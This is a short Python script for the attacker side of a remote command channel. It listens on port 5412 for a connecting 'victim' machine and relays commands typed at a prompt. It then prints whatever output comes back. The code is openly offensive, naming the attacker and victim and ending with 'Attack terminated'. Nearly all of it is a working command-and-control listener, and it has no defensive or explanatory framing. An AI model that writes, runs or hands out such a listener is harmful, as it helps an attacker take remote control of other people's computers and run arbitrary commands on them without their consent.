import socket
import struct

attacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
attacker_ip = '0.0.0.0'
attacker_port = 5412
attacker_socket.bind((attacker_ip, attacker_port))

attacker_socket.listen(1)
victim, victim_ip = attacker_socket.accept()
print("Victim connected")


def read_payload(connection):
    total_payload_length = int(str(connection.recv(1024).decode()))
    data_received = ''
    chunk = connection.recv(1024)
    data_received = data_received + chunk.decode()
    while len(data_received.encode("utf-8")) < total_payload_length:
        #print("Inside while")
        chunk = connection.recv(1024)
        data_received = data_received + chunk.decode()
        #print("Data received currently: " + data_received)
    print("Data received: \n")
    print(data_received)
    return None
    

def send_command(connection, command):
    connection.send(str(len(command.encode("utf-8"))).encode())
    connection.send(command.encode())
    print("Command: " + command + " sent\n")
    return 

#read_payload(victim)

while True:
    command = input(">>>")
    send_command(victim, command)
    if command == "EXIT":
        break
    read_payload(victim)

attacker_socket.close()
print("Attack terminated")

